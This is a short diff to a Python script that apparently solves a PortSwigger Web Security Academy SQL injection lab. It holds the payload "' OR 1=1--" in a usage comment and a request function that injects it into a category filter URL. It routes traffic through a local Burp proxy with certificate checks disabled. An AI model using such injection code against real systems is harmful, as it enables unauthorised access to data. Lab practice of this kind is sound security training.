@@ -4,12 +4,11 @@ import urllib3;
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 #CMD: python3 sqli-lab-01.py https://0a8900c603d883c780877152002f0049.web-security-academy.net "' OR 1=1--"
-#proxies = {'http': 'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'} - Use with Burp suite Proxy
+proxies = {'http': 'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'} 
 
 def exploit_sqli(url,payload):
     uri = '/filter?category='
-    #r = requests.get(url + uri + payload,verify=False,proxies=proxies) With Burp Suite Proxy
-    r = requests.get(url + uri + payload,verify=False)
+    r = requests.get(url + uri + payload,verify=False,proxies=proxies)
     if "Cat Grin" in r.text :
         return True
     else:
